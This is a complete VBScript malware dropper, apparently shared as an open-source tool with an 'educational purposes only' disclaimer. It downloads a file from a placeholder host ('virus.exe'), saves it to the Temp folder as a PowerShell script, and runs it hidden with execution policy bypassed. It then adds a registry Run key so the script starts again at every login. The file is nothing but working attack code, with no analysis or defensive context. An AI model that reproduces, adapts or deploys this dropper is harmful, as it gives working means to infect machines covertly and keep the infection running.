// Author     : UmutGllr // Darkfeyz
// Name       : VBS Downloader and Executer
// Contact    : https://www.linkedin.com/in/umutguller/

// This script is distributed for educational purposes only.
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "http://FileAdress.com/virus.exe", False
xHttp.Send
scriptShell = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%") + "\Loader.ps1"
with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile scriptShell, 2
end with
WScript.Sleep 1000
ExecuteAndInstall(scriptShell)

Function ExecuteAndInstall(path)
Set objShell = CreateObject("Wscript.shell")
objShell.run("powershell -executionpolicy bypass -noprofile -windowstyle hidden -noexit -file " + path)
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\NyanShell","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden -noexit -file " + path,"REG_SZ"
End Function
